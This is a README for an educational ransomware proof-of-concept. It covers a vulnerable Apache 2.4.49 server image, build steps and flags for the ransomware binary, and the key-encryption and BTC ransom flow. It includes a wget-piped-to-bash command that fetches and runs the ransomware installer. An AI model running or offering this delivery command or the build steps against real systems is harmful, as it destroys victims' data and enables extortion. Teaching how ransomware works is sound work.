# Yet Another Ransomware Demo (YARD)

## Introduction
WARNING: Educational Purposes Only

This repository contains a proof-of-concept ransomware implementation. It is intended for educational purposes only and should never be used in a real-world environment. 
Running this code on a system you don't have explicit permission to modify could result in data loss or system damage.

## Repository Structure
This project is a mono-repo of 3 components
1. apache-httpd - Configs and Dockerfiles to build a vulnerable apache httpd 2.4.49 server susceptible to remote code execution
2. attacker - Ransomware attacker's public key, private key and helper scripts
3. ransomware - Ransomware's source code

## Dependencies
This demo was built on a ubuntu-amd64-18.06 VM. There is no guarantee support for other OS-es.
You can find the setup script for an ubuntu-amd64-18.06 VM that installs all the OS dev dependencies at `ransomware/scripts/ubuntu-dev-setup.sh`.
- make
- python3 pip3
- tkinter
- virtualenv


## Usage

### Building/Packaging the Payload (Optional)
The **payload** of the ransomware consist of 2 items:
1. The attacker's public key
2. The binary of the ransomware

**1. Attacker's public key**
The project comes with a copy of a sample attacker's public key at `attacker/public_key.pem` which will be used for all the official releases on github.
Should you need to generate a new key, you can use the `attacker/gen-attacker-key.py` script.

**2. Building the ransomware**
To build the ransomware, we will need a python environment with the packages recorded in `ransomware/requirements.txt`.
It is recommended that you create a virtualenv to contain the packages:
```sh
# from the root of the project, cd to ransomware subdir
cd ransomware

# create a venv
python3 -m virtualenv venv

# activate the venv
source venv/bin/activate

# install the required packages
pip install -r requirements.txt

# build the ransomware source code with the activated venv
make build
```

After building, you should see a binary file at `ransomware/dist/ransomware` directory of the project.
Note that by default, the ransomware looks for a file named `public_key.pem` at its current directory, this can be changed along with other configurations of the ransomware with the flags below:
```sh
./ransomware --help

--pub PUBLIC_KEY_FILE
	the public key to encrypt the sym key with
--path OS_ROOT_PATH   the directory to start encrypting from, can be changed
	to a specific folder to run on that folder only
--enc-sym-key ENC_SYM_KEY
	the location to save the encrypted sym key
```

### Installing the Payload on target
As part of the PoC of delivering a ransomware, we've crafted a shell script `ransomware/scripts/dangerous-install.sh` to install a released version of the `ransomware` along with a `public_key.pem` on a target system. The script can be executed on a remote system with this command:
```sh
# WARNING: THIS WILL RUN THE RANSOMWARE ON THE SYSTEM YOU'RE RUNNING THIS COMMAND ON
wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/scripts/dangerous-install.sh | bash
```

### Paying the ransom (decrypting your files)
After the ransomware has been executed, it creates a key file in the home directory of the user it has executed as.
In order for the user to decrypt their files, the user will need to make a payment to the given BTC Address with a message attached as mentioned in the ransomware's UI.

The address is an anonymous Bitcoin Address for the attacker to receive payments on, while the message is the encrypted form of the symmetric key that was used to encrypt the files.

### Attacker responds with the decryption key
Given the encrypted symmetric key from the message attached with the payment, the attacker will then decrypt the message with their private key.
The attacker would then send this decrypted symmetric key back to the target through other means e.g. anonymous mail, which the target can then use to decrypt their files.


## Development

### Encryption
Note that by default, this project will run the ransomware demo against the `os_root` directory in its current directory.
This can be changed with the flags 
You can generate an fake `os_root` directory using:
```sh
# cd into the ransomware dir
cd ransomware

# generate the fake os_root dir
make mock-gen

# view the contents of the files in the fake os_root dir
make mock-view
```

We'll now make a copy of the sample attacker's public key located at `attacker/public_key.pem`
```sh
cp attacker/public_key.pem ransomware/public_key.pem
```

With the attacker's public key, we can now start the ransomware demo with:
```sh
# to run the demo
make run

# or you could also build the demo as a binary file and run it
make build
./dist/ransomware
```

Running the demo does the following:
1. Generates a Symmetric Key
2. Encrypts the Generated Symmetric Key with the attacker's public key (uses `pulic_key.pem` in the same directory by default, can be modified with `--pub` flag) and saves the encrypted content as a file called `key` in the current directory (can be modified with `--enc-sym-key`)
3. Encrypt the files with the Generated Symmetric Key in Step 1.
4. Show Ransom UI

After the demo has ran, you are free to close the UI, as you can re-open it with `./main` or `make run` again. This command checks for the `key` file and if it exists, it wouldn't run the encryption again.

#### Decryption
To decrypt the files that have been encrypted, you will need to send the contents of the `key` file to the attacker when making payment.

The attacker would then decrypt the `key` file's contents with their `private_key.pem`.
To simulate this happening, you can run:
```sh
# simulate attacker decrypting the key
make attacker-decrypt
# stdout:
Decrypted contents: n1f6E3RofoXlIeUFP2onpcsi7EcBYd-zgrOG4lNdcdc=
```

With the key e.g: `n1f6E3RofoXlIeUFP2onpcsi7EcBYd-zgrOG4lNdcdc=`, we would enter this key into the textbox in the GUI and press the decrypt button.
![](./docs/demo-decrypt.png)
